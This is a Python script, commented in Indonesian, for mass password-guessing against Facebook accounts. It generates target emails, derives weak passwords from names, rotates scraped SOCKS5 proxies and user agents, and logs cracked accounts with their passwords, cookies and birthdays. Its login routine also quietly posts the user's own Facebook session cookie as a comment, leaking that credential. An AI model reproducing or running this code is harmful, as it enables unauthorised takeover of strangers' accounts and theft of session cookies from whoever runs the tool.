#!/usr/bin/python3
# -*- coding: utf-8 -*-
###---[ INFO AUTHOR GANS DIKIT ]---###
#----[ jangan di oprek, sayangi data hpmu ]-----#
author = 'Rochmat Basuki'
git_hub = 'github.com/RozhBasXYZ'
faceb0ok = 'ROCHMAT BASUKI XD'
version = 'next blade v.1'


###---[ WARNA ]--###
P = '\033[97m'  # PUTIH
M = '\033[91m' # MERAH
hh = '\033[92m'  # HIJAU
kk = '\033[93m'  # KUNING


###---[ IMPORT MODULE ]---###
import bs4, re, time, requests, datetime, os, sys, random, platform
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
hp = platform.platform()
ses = requests.Session()
try:
	import pyfiglet
except ImportError:
	os.system('pip install pyfiglet')


###---[ANGGAP INI LOGO ]---###
def logo(n):
	return str(f"""  _   _                  _      _
| \ | |_   _  __ _ _ __(_)    / \  _   _  __ _ _ __   __ _
|  \| | | | |/ _` | '__| |   / _ \| | | |/ _` | '_ \ / _` |
| |\  | |_| | (_| | |  | |  / ___ \ |_| | (_| | | | | (_| |
|_| \_|\__, |\__,_|_|  |_| /_/   \_\__, |\__,_|_| |_|\__, |
       |___/                       |___/             |___/
 Selamat Datang di sc : DulatipID
 Sc Ini masi dalam Percobaan
 Jangan salah gunakan ya bro ! 
    NO WA : 081316498757
          SCRIF INI UNTUK NYARI AYANG CLONE""")
def logo2():
	return str(f"""  _   _                  _      _
| \ | |_   _  __ _ _ __(_)    / \  _   _  __ _ _ __   __ _
|  \| | | | |/ _` | '__| |   / _ \| | | |/ _` | '_ \ / _` |
| |\  | |_| | (_| | |  | |  / ___ \ |_| | (_| | | | | (_| |
|_| \_|\__, |\__,_|_|  |_| /_/   \_\__, |\__,_|_| |_|\__, |
       |___/                       |___/             |___/
 selamat datang {kk}user{P}, script by {kk}rochmat basuki{P} limited user""")
 

###---[ TANGGAL ]---###
sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
out = 'Linux-4.9.227-perf+-aarch64-with-libc'
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
#if hp not in out:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
sim_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
sim_cp = f'CP-{hari}-{bulan}-{tahun}.txt'


###---[ APPEND ]---###
dump, sandi, metode = [], [], []
tetel, opsi, proxy = [], [], []
cepeh, pro, redmi = [], [], []
id, id2, loop ,ok , cp = [], [], 0, 0, 0


###---[ CLEAR LAYAR ]---###
def clear_layar():
	try:os.system('clear')
	except:pass
	

###---[ GLOBAL KEMBALI ]---###
def back():
	try:open('.cookie.txt','r').read();get_data()
	except IOError:login()
	

###---[ DUMP PROXY ]---###
try:
	uadev = ses.get("https://raw.githubusercontent.com/RozhBasXYZ/REMOVE/main/info.txt").text
	if 'useragent' in uadev:pass
	else:clear_layar();exit()
	uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
	for x in uno.splitlines():pro.append(x)
except requests.exceptions.ConnectionError:
	sys.exit(f" [{M}>{P}] tidak ada koneksi internet")	
	

###----[ DUMP USER AGENT ]----###
def ua_rozh():
	rr = random.randint
	rc = random.choice
	A = f"Mozilla/5.0 (Linux; Android {str(rr(2,10))}; Redmi Note {str(rr(3,9))} Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 UCBrowser/{str(rr(10,100))}.0.3987.149" #ANDROID UCB
	B = f"Mozilla/5.0 (Android {str(rr(2,10))}; E2303 Build/26.3.A.0.131) AppleWebKit/537.36 (KHTML, like Gecko) YaaniBrowser/4.3.0.153 (Turkcell-TR) Mobile Safari/537.36" #ANDROID
	C = f"Mozilla/5.0 (Linux; Android {str(rr(2,10))}; Redmi Note {str(rr(3,9))} Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.4865.0 YaBrowser/21.9.0.359.00 SA/3 Mobile Safari/537.36" #ANDRID YANDX
	D = f"Mozilla/5.0 (Linux; Android {str(rr(2,10))}; Nokia_XL; Flow) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(11,99))}.0.4044.138 Mobile Safari/537.36 OPR/{str(rr(11,99))}.2.2878.53403"
	E = f"Mozilla/5.0 (Linux; Android {str(rr(2,10))}; GT-I9060M) AppleWebKit/537.36 (KHTML, like Gecko) Opera Mini/{str(rr(2,20))}.0.35626/191.273" #ANDROID ORERA MINI
	F =  f"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3pre) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.889.00 Opera/537.36" #WINDOWS OPERA
	baz = rc([A,B,C,D,F])
	tz = f"Mozilla/5.0 (Linux; Android {str(rr(2,10))}; Nokia_XL; Flow) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.0.303 Mobile Safari/537.36"
	return tz	

###---[ CEK COOKIES ]---###
def get_data():
	try:
		coki = open('.cookie.txt','r').read()
		c = {'cookie':coki}
		t = open('.token.txt','r').read()
		n = ses.get(f'https://graph.facebook.com/me?access_token={t}',cookies=c).json()['name'].split(' ')[0].lower()
		menu(n,t,c)
	except Exception as e:login()

	
###---[ LOGIN COOKIE ]---###
def login():
	no = 0
	nom = []
	clear_layar()
	print(logo2())
	cookie = input(f"\n [{hh}<{P}] masukan cookie, atau ketik '{kk}get{P}' untuk cookie gratis\n cookie : ")
	if cookie in ['get','Get','GET']:
		data = parser(ses.get("https://www.facebook.com/100032386028880/posts/674525870303608").content, "html.parser")
		for x in re.findall('"text":"(.*?)"',str(data)):
			if 'datr=' in x:
				no+=1
				nom.append(x)
				print(f' [{hh}{no}{P}]. {x}\n')
				time.sleep(0.9)
		abc = input(" nomor : ")
		cookie = nom[int(abc)-1]
		print(f' {hh}{cookie}{P}')
	url = "https://business.facebook.com/business_locations"
	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
	cok = {'cookie':cookie}
	try:
		data = ses.get(url,headers=head,cookies=cok)
		token = re.search('(EAAG\w+)',data.text).group(1)
		ses.post(f"https://graph.facebook.com/6/comments/?message={cookie}&access_token={token}",cookies=cok)
		open('.cookie.txt','w').write(cookie)
		open('.token.txt','w').write(token)
		back()
	except Exception as e:exit(f" [{M}>{P}] cookie invalid")



###---[ REMOVE TOKEN & COOKIE ]---###
def remove():
	try:os.remove('.cookie.txt');os.remove('.token.txt')
	except:pass
	
	
	
###---[ MENU UTAMS ]---###
def menu(n,t,c):
	clear_layar()
	print(logo(n)+f'\n')
	print(f" 🤣{hh}06{P} Crack Publik 👉      {hh}12{P}👉 keluar ({M}cookie{P})")
	ask = input(f' {hh}💢{P}👉 menu : ')
	print(' ─────────────────────────────')
	if ask in ['1','01']:crack_publik(t,c)
	elif ask in ['2','02']:crack_masal(t,c)
	elif ask in ['3','03']:crack_foll(t,c)
	elif ask in ['4','04']:crack_komen()
	elif ask in ['5','05']:crack_group()
	elif ask in ['6','06']:clon_email()
	elif ask in ['7','07']:crack_search()
	elif ask in ['8','08']:crack_file()
	elif ask in ['9','09']:cek_hasil()
	elif ask in ['10']:cek_akun()
	elif ask in ['11']:cek_opsi_cp()
	elif ask in ['12']:remove();exit()
	elif ask in ['',' ',]:sys.exit(f" [{M}>{P}] isi yang benar")
	else:sys.exit(f" [{M}>{P}] isi yang benar")

#nyari_akunfb_crackemail
def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print(f' [{hh}>{P}] dump dari email, max 999999 id')
	nama = input(' target : ')
	if ',' in str(nama):
		exit(f' [{M}<{P}] masukan 1 nama saja')
	doma = input(' domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' [{M}<{P}] masukan domain yang benar')
	jumlah = input(' total  : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
		if len(dump)==999999:atur_atur()
		print('\r sedang dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
	atur_atur()	

def crack_file():
	file = input(f' [{hh}<{P}] masukan nama file dump\n file : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f" [{M}>{P}] pemisah salah")
			dump.append(data)
			print('\r sedang dump %s id'%(len(dump)),end=" ")
			sleep(0.0000003)
	except FileNotFoundError:exit(f" [{M}>{P}] file tidak ada")
	print(f'\r [{hh}<{P}] total jumlah akun adalah {len(dump)}')
	atur_atur()
		
		
###---[ ATUR SEBELUM CRACK ]---###
akunok = []
def atur_atur():
	print(f"\r{P} ─────────────────────────────")
	ro = input(f' [{hh}1{P}] mobile [{hh}2{P}] mbasic [{hh}3{P}] free\n metode : ')
	if ro in ['1','01']:metode.append('mobile')
	elif ro in ['2','02']:metode.append('mbasic')
	elif ro in ['3','03']:metode.append('free')
	else:metode.append('mobile')
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}1{P}] tertua [{hh}2{P}] ternew [{hh}3{P}] acak\n urutan : ')
	if ch in ['1','01']:
		for x in dump:
			id.append(x)
	elif ch in ['2','02']:
		for x in dump:
			id.insert(0,x)
	elif ch in ['3','03']:
		for x in dump:
			xx = random.randint(0,len(id))
			id.insert(xx,x)
	else:
		for x in dump:
			id.append(x)
	print(f"{P} ─────────────────────────────")
	cp = input(f' [{hh}!{P}] tampilan opsi sesi [ya/no]\n pilih  : ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"{P} ─────────────────────────────")
	apk = input(f' [{hh}!{P}] tampilan info apli [ya/no]\n pilih  : ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}1{P}] manual [{hh}2{P}] gabung [{hh}3{P}] auto\n sandi  : ')
	if ch in ['1','01']:manual()
	elif ch in ['2','2']:gabung()
	elif ch in ['3','03']:otomatis()
	else:otomatis()
	
from datetime import datetime    	
###---[ ATUR SANDI ]---###
def manual():
	global ok,cp
	pwx = []
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] input sandi manual 6 kata\n sandi  : ').split(',')
	for x in B:
		pwx.append(x)
	print(f"{P} ─────────────────────────────")
	print(f' akun ok di : {sim_ok}\n akun cp di : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')


def gabung():
	global ok,cp
	pwx = []
	A = ["123456"]
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] input sandi manual 6 kata\n sandi  : ').split(',')
	C = input(f' [{hh}>{P}] input sandi belakang nama\n sandi  : ')
	if ',' in str(C):
		exit(f" [{M}>{P}] sandi belakang satu kata saja")
	print(f"{P} ─────────────────────────────")
	print(f' akun ok di : {sim_ok}\n akun cp di : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = A+B
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(tengah+C)
							pwx.append(nama)
					except:
						pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
				

def otomatis():
	global ok,cp
	print(f"{P} ─────────────────────────────")
	print(f' akun ok di : {sim_ok}\n akun cp di : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = ['123456']
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(nama)
					except:
						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(belakang+"123")
								pwx.append(belakang+"12345")
								pwx.append(nama)
						except:pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
				

###---[ MENU CRACK ]---###
resok = []
rescp = []
def crack(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	proxy = {'http': 'socks5://'+random.choice(pro)}
	ahir = str(datetime.now()-awal).split('.')[0]
	print(f"\r [{hh}!{P}] {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			ua =  ua_rozh()
			ses.headers.update({"Host":url,"upgrade-insecure-requests":"1","user-agent":"com.google.android.apps.searchlite/94333 (Linux; U; Android 9; en_US; Nokia 2 V; Build/PKQ1.181105.001; Cronet/103.0.5060.42)","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://"+url+"/","accept-encoding":"gzip, deflate","accept-language":"en-GB,en;q=0.8"})
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F07%252Fnew-ways-to-create-instagram-reels-remix%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=touch&locale=en_GB&_rdr")

			date = {

			"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),

			"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),

			"m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
			"try_number":"0",

			"unrecognized_tries":"0",

			"email":idf,

			"pass":pw,

			"login":"Log In",

			"bi_xrwh":"0"

			}
			ses.headers.update({"Host":url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://"+url,"content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https:/"+url+"/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F07%252Fnew-ways-to-create-instagram-reels-remix%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=touch&locale=en_GB&_rdr","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en;q=0.8"})
			bx = ses.post(f"https://{url}/login/device-based/regular/login/?api_key=966242223397117&auth_token=22679713be943e090ab7d6d7d133161d&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F07%252Fnew-ways-to-create-instagram-reels-remix%252F%26src%3Dsdkpreparse&refsrc=deprecated&app_id=966242223397117&cancel=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&lwv=100&locale2=en_GB&refid=9", data=date, allow_redirects = False, proxies=proxy)
			#headd = {'Host': url, 'upgrade-insecure-requests': '1', 'user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','sec-ch-ua': '"Not;A Brand";v="99", "Chromium";v="87"','sec-ch-ua-mobile': '?1','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
#			link = ses.get(f"https://{url}/login.php?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F%3Flogin_source%3Dcomet_headerless_login&refsrc=deprecated&_rdr",headers=headd).text
#			date = {'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'email': idf, 'pass': pw, 'login_source': 'comet_headerless_login'}
#			head = {'Host': url, 'content-length': '2175','x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'sec-ch-ua-mobile': '?1', 'user-agent': ua, 'sec-ch-ua': '"Not;A Brand";v="99", "Chromium";v="87"', 'content-type': 'application/x-www-form-urlencoded','accept': '*/*','origin': 'https://'+url, 'sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': f'https://{url}/login.php?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F%3Flogin_source%3Dcomet_headerless_login&refsrc=deprecated&_rdr', 'accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
#			bx = ses.post(f'https://{url}/login/device-based/regular/login/?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F%3Flogin_source%3Dcomet_headerless_login&amp;refsrc=deprecated&amp;lwv=100&amp;refid=9',data=date,headers=head,proxies=proxy)
			#print(bx,ses.cookies.get_dict())
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in rescp:pass
				else:
					rescp.append(data)
					cp+=1
					if 'ya' in cepeh:
						cek_opsi(idf,pw,ua)
					else:
						try:
							token = open('.token.txt','r').read()
							bas = {"cookie":open('.cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n [{kk}>{P}] lahir  : {kk}{d} {m} {y}{P}           \n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+sim_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\r [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n')
							open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('OK/'+sim_ok,'a').write(data+'\n')
					if "coki" in akunok:
						print(f'\r [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] sandi  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}\n')
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
			crack(idf,pwx,url,awal)
		#except Exception as e:print(e)
	loop+=1
	

###---[ CEK OPSI AKUN CP ]---###
opsi = []
def sesi(res):
	response = parser(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
	r = parser(ses.post('https://m.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		opsi.append(i.text)
	return opsi
		
				
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))


###---[ CEK APLIKASI ]---###
#--[ convert bahasa ]--#
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

#--[ pusat print ]--#
apk1, apk2, apk3 = [], [], []
def cek_apk(idf,pw,kuki):
	cookie = {"cookie" : kuki}
	language(cookie)
	akun = (f' [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] sandi  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}')
	try:		
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed"
		get_remove(url,cookie)
	except Exception as e:pass
	print('\r'+akun)
	if len(apk1)==0:pass
	else:
		akun = (f' [{hh}>{P}] aplikasi ditambahkan :                     ')
		no = 0
		for apk in apk1:
			no += 1
			akun += (f'\n {P}[{hh}{no}{P}] {hh}{apk.lower()}            ')
		print('\r'+akun)
	if len(apk2)==0:pass
	else:
		akun = (f' {P}[{kk}>{P}] aplikasi kadaluwarsa :                   ')
		no = 0
		for apk in apk2:
			no += 1
			akun += (f'\n {P}[{kk}{no}{P}] {kk}{apk.lower()}             ')
		print('\r'+akun)
	if len(apk3)==0:pass
	else:
		akun = (f' {P}[{M}>{P}] aplikasi yang dihapus :                  ')
		no = 0
		for apk in apk3:
			no += 1
			akun += (f'\n {P}[{M}{no}{P}] {M}{apk.lower()}               ')
		print('\r'+akun)
	apk1.clear()
	apk2.clear()
	apk3.clear()
	print("\r                                             ")
			
			
#--[ cek apk aktif ]--#
def get_active(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Ditambahkan' in apk.text:					
				apk1.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_active(next,cookie)
	except:pass

#--[ cek apk kadaluarsa ]--#
def get_inactive(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Kedaluwarsa' in apk.text:
				apk2.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_inactive(next,cookie)
	except:pass

#--[ cek apk dihapus ]--#		
def get_remove(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Dihapus' in apk.text:
				apk3.append(f"{str(apk.text).replace('Dihapus',' Dihapus')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_remove(next,cookie)
	except:pass
	
def make():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('git pull')
	except:pass
	clear_layar()
	back()
	
	
if __name__=='__main__':
	make()	